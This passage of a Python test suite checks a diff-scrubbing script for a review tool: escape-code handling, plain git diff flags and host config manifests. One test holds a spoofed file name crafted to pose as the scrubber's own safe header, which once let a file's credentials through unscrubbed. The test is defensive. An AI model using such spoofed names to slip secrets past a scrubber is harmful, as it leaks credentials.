        assert done.returncode == 1 and key not in done.stdout

    def test_a_files_own_escapes_are_kept(self) -> None:
        # Stripped for every line, a file's own escape codes were taken out of the diff.
        diff = "diff --git a/a b/a\n@@ -0,0 +1 @@\n+print('\x1b[1mbold')\n"
        done = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT)], input=diff, capture_output=True,
            text=True, timeout=30,
        )  # fmt: skip
        assert done.returncode == 0 and done.stdout == diff

    def test_the_loop_asks_git_for_a_plain_diff(self) -> None:
        from scripts.review_loop import diff

        assert set(diff._PLAIN) == {"--no-color", "--no-ext-diff", "--no-textconv"}
        doc = AGENT_DOC.read_text()
        assert "git diff --no-color --no-ext-diff --no-textconv --merge-base" in doc


class TestSafeFileHeader:
    def test_a_name_that_spells_a_safe_header_is_not_safe(self) -> None:
        # Split into tokens, every a/ and b/ one named the scrubber, and the file's
        # credentials passed as the scrubber's own fixtures.
        spoof = "scripts/scrub_diff.py b/scripts/scrub_diff.py"
        assert not scrub_diff._is_safe_file(f"diff --git a/{spoof} b/{spoof}\n")
        assert scrub_diff._is_safe_file(
            "diff --git a/scripts/scrub_diff.py b/scripts/scrub_diff.py\n"
        )
        assert not scrub_diff._is_safe_file(
            "diff --git a/scripts/scrub_diff.py b/elsewhere.py\n"
        )


class TestHostConfigManifests:
    def test_manifests_and_artifact_dirs_come_from_review_config(
        self, tmp_path: Path
    ) -> None:
        # Set in config.py, which install.sh overwrites, a host's manifests were lost on
        # every re-install.
        from scripts.preflight import config as preflight_config

        where = tmp_path / "review-config.json"
        where.write_text(json.dumps({
            "signed_manifests": {"cols": "m/cols.json"}, "artifact_dirs": ["out/"],
        }))  # fmt: skip
        with mock.patch.object(preflight_config, "HOST_CONFIG", where):
            assert preflight_config._manifests("signed_manifests") == {
                "cols": "m/cols.json"
            }
            assert preflight_config._dirs("artifact_dirs", ["data/"]) == ["out/"]
        where.write_text(json.dumps({"signed_manifests": ["not", "a", "map"]}))
        with mock.patch.object(preflight_config, "HOST_CONFIG", where):
            assert preflight_config._manifests("signed_manifests") == {}
